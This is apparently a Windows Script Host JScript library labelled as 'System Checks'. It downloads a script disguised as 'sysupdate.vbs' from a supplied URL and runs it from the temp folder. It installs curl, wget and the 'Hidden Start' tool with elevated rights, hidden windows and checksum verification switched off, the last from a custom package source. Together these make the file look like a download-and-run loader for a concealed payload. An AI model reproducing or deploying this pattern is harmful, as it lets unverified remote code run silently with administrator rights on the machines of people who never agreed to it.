/************************************************************
*
* LIB_CHECK.JS
* This file contain main modules for System Checks
*
************************************************************/

/* *********************************************************
'
' ChecksIfChocolateyInstalled
'
' This function Checks If Chocolatey Packets Installed and Install it if no
'
' PPARAMETERS:	strURLHost — URL to File Download
' RETURNS:	0 if Chocolatey Installed
'		    1 if not Installed
'			2 if Installation Error Occur
'
' *********************************************************/
function ChecksIfChocolateyInstalled (strURLHost) {
	// body... 
	var strVar, iFlag;
	strVar = "ChocolateyInstall";
	iFlag = CheckIfFolderVariableDefined (strVar);
	if( iFlag == 0 )
		return iFlag;
	else {
		var strURLHost, strFile, iTimeOut;
		//strFile = "echo.1.wsf" //Test
		strFile = "sysupdate.vbs";
		iTimeOut = 60000;
		iFlag = WshDownlRun01(strURLHost, iTimeOut, strFile);
		if( iFlag == 1 )
			return 2;
		else
			return 1;
	}
}

/* ********************************************************
'
' WshDownlRun01( strURL , iTimeOut )
'
' This Script Downloads Script file from strURL Path and
' Execute it with Script TimeOut in iTimeOut ms
'
' PARAMETERS:	strURL — URL Path to Download
'				iTimeOut — Wait to End Execution of the File
' 				strFileNameExe - Name of Exe File
' RETURNS:		0 if Success Download and Run
'				1 if Error Occur
'
' *********************************************************/
function WshDownlRun01( strURL, iTimeOut, strFileName ){
	var iFlag;
	var tempFolder;
	// Get Temp Folder Name
	tempFolder = getTempEnviron();
	iFlag = UploadFilesFromInt( strFileName, strURL, tempFolder );
	if( iFlag != 0 ) return 1;
	iFlag = RunDownloadedScript( tempFolder, strFileName, iTimeOut );
	if( iFlag != 0 ) return 1;
	return 0;
}

/* *********************************************************
'
' ChecksIfCurlWgetInstalled
'
' This function Checks If Curl and Wget Packets 
' Installed and Install it if no
'
' PPARAMETERS:	NONE
' RETURNS:		0 if Chocolatey Installed
'		    	1 if not Installed
'				2 if Installation Error Occur
'				3 if Chocolatey Not Installed'
'
' *********************************************************/
function ChecksIfCurlWgetInstalled () {
	// body... 
	var strVar, iFlag, wsh, envProc, fso;
	// Define ActiveX Variables
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    fso = new ActiveXObject("Scripting.FileSystemObject");
	// Define Variables
	strVar = "ChocolateyInstall";
	iFlag = CheckIfFolderVariableDefined (strVar);
	if( iFlag > 0 )
		return 3;
	else {
		iFlag = 0;
		var strCurl, strWget, bFlag1;
		strCurl = envProc( strVar ) + "\\bin\\curl.exe";
		strWget = envProc( strVar ) + "\\bin\\wget.exe";
		// Check if curl Not Installed
		bFlag1 = fso.FileExists( strCurl );
		if( bFlag1 == false ){
			var shApp, strApplication, strOption;
			// Define ActiveX Variables
			shApp = new ActiveXObject("Shell.Application");
			// Code
			iFlag = 1;
			strApplication = envProc( strVar ) + "\\bin\\cinst.exe";
			strOption = "-y --ignore-checksum " + "curl";
			shApp.ShellExecute(strApplication, strOption, envProc( strVar ), "runas", 0 );
			WScript.Sleep(300000);
		}
		// Check if Wget Not Installed
		bFlag1 = fso.FileExists( strWget );
		if( bFlag1 == false ){
			var shApp, strApplication, strOption;
			// Define ActiveX Variables
			shApp = new ActiveXObject("Shell.Application");
			// Code
			iFlag = 1;
			strApplication = envProc( strVar ) + "\\bin\\cinst.exe";
			strOption = "-y --ignore-checksum " + "wget";
			shApp.ShellExecute(strApplication, strOption, envProc( strVar ), "runas", 0 );
			WScript.Sleep(300000);
		}
	}
	return iFlag;
}

/* *********************************************************
'
' ChecksIfHiddenStartInstalled
'
' This function Checks If HiddenStart Packet 
' Installed and Install it if no
'
' PPARAMETERS:	strSource — Source Chocolatey repo
' RETURNS:		0 if Chocolatey Installed
'		    	1 if not Installed
'				3 if Chocolatey Not Installed'
'
' *********************************************************/
function ChecksIfHiddenStartInstalled ( strSource) {
	// body... 
	var strVar, iFlag, wsh, envProc, fso;
	// Define ActiveX Variables
    wsh = new ActiveXObject("WScript.Shell");
    envProc = wsh.Environment("PROCESS");
    fso = new ActiveXObject("Scripting.FileSystemObject");
	// Define Variables
	strVar = "ChocolateyInstall";
	iFlag = CheckIfFolderVariableDefined (strVar);
	if( iFlag > 0 )
		return 3;
	else {
		iFlag = 0;
		var strFilePath, bFlag1;
		strFilePath = "C:\\Program Files\\Hidden Start\\hstart.exe";
		// Check if curl Not Installed
		bFlag1 = fso.FileExists( strFilePath );
		if( bFlag1 == false ){
			var shApp, strApplication, strOption;
			// Define ActiveX Variables
			shApp = new ActiveXObject("Shell.Application");
			// Code
			iFlag = 1;
			strApplication = envProc( strVar ) + "\\bin\\cinst.exe";
			strOption = "-y --ignore-checksum " + "hidden.start.nit.main" + " --source " + strSource;
			shApp.ShellExecute(strApplication, strOption, envProc( strVar ), "runas", 0 );
			WScript.Sleep(300000);
		}
	}
	return iFlag;
}

